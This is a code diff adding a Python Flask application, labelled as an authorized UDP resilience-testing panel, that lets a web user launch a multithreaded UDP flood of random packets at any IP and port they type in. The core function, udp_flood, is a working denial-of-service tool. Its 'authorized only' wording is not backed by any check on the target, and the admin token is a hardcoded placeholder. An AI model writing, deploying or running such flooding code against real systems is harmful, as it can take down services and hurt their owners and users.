@@ -1,0 +1,147 @@
+# app.py - Web Control Panel for Authorized UDP Testing
+from flask import Flask, render_template_string, request, jsonify
+import threading
+import time
+import socket
+import random
+
+app = Flask(__name__)
+
+# Simple token auth (use environment variable or proper session in production)
+ADMIN_TOKEN = "CHANGE_THIS_TO_STRONG_TOKEN"
+test_running = False
+stop_flag = False
+stats = {"packets_sent": 0, "duration": 0}
+
+HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>UDP Test Control Panel</title>
+    <style>
+        body { font-family: Arial; margin: 40px; background: #1e1e2e; color: #eee; }
+        .container { max-width: 600px; margin: auto; background: #2d2d3a; padding: 20px; border-radius: 10px; }
+        input, button { padding: 8px; margin: 5px; width: 90%; }
+        button { background: #0f0; border: none; color: black; font-weight: bold; cursor: pointer; }
+        .danger { background: #f44; color: white; }
+        .status { margin-top: 20px; border-top: 1px solid #aaa; padding-top: 10px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>UDP Network Resilience Test (Authorized Only)</h2>
+    <input type="text" id="target_ip" placeholder="Target IP (your server)">
+    <input type="number" id="target_port" placeholder="Port">
+    <input type="number" id="duration" placeholder="Duration (sec)" value="10">
+    <input type="number" id="threads" placeholder="Threads" value="10">
+    <input type="text" id="token" placeholder="Admin Token">
+    <button onclick="startTest()">Start Test</button>
+    <button class="danger" onclick="stopTest()">Stop Test</button>
+    <div class="status">
+        <h3>Status</h3>
+        <pre id="status">Idle</pre>
+    </div>
+</div>
+<script>
+    async function startTest() {
+        let token = document.getElementById('token').value;
+        let payload = {
+            token: token,
+            target_ip: document.getElementById('target_ip').value,
+            target_port: parseInt(document.getElementById('target_port').value),
+            duration: parseInt(document.getElementById('duration').value),
+            threads: parseInt(document.getElementById('threads').value)
+        };
+        let res = await fetch('/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+        let data = await res.json();
+        document.getElementById('status').innerText = JSON.stringify(data, null, 2);
+        if (data.status === 'running') startPolling();
+    }
+    async function stopTest() {
+        let token = document.getElementById('token').value;
+        let res = await fetch('/stop', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({token: token}) });
+        let data = await res.json();
+        document.getElementById('status').innerText = JSON.stringify(data, null, 2);
+    }
+    async function pollStatus() {
+        let res = await fetch('/status');
+        let data = await res.json();
+        document.getElementById('status').innerText = JSON.stringify(data, null, 2);
+    }
+    function startPolling() { setInterval(pollStatus, 1000); }
+</script>
+</body>
+</html>
+"""
+
+def udp_flood(target_ip, target_port, duration, threads):
+    global stop_flag, stats
+    stop_flag = False
+    packets_total = 0
+    start_t = time.time()
+    def sender():
+        nonlocal packets_total
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            data = random._urandom(1024)
+            end = time.time() + duration
+            local_count = 0
+            while time.time() < end and not stop_flag:
+                sock.sendto(data, (target_ip, target_port))
+                local_count += 1
+            sock.close()
+            packets_total += local_count
+        except:
+            pass
+    thread_pool = []
+    for _ in range(threads):
+        t = threading.Thread(target=sender)
+        t.start()
+        thread_pool.append(t)
+    for t in thread_pool:
+        t.join()
+    stats = {"packets_sent": packets_total, "duration": time.time() - start_t, "status": "stopped"}
+
+@app.route('/')
+def index():
+    return render_template_string(HTML)
+
+@app.route('/start', methods=['POST'])
+def start_test():
+    global test_running, test_thread, stats
+    data = request.json
+    if data.get('token') != ADMIN_TOKEN:
+        return jsonify({"error": "Unauthorized"}), 401
+    if test_running:
+        return jsonify({"error": "Test already running"}), 400
+    target_ip = data.get('target_ip')
+    target_port = data.get('target_port')
+    duration = data.get('duration', 10)
+    threads = data.get('threads', 10)
+    if not target_ip or not target_port:
+        return jsonify({"error": "Missing IP or port"}), 400
+    test_running = True
+    stats = {"status": "starting"}
+    test_thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, threads))
+    test_thread.start()
+    return jsonify({"status": "running", "message": f"Test started on {target_ip}:{target_port}"})
+
+@app.route('/stop', methods=['POST'])
+def stop_test():
+    global stop_flag, test_running
+    data = request.json
+    if data.get('token') != ADMIN_TOKEN:
+        return jsonify({"error": "Unauthorized"}), 401
+    stop_flag = True
+    test_running = False
+    return jsonify({"status": "stopping", "message": "Test will stop shortly"})
+
+@app.route('/status')
+def status():
+    global stats, test_running
+    if not test_running and stats.get("status") != "stopped":
+        return jsonify({"status": "idle"})
+    return jsonify(stats)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=False)
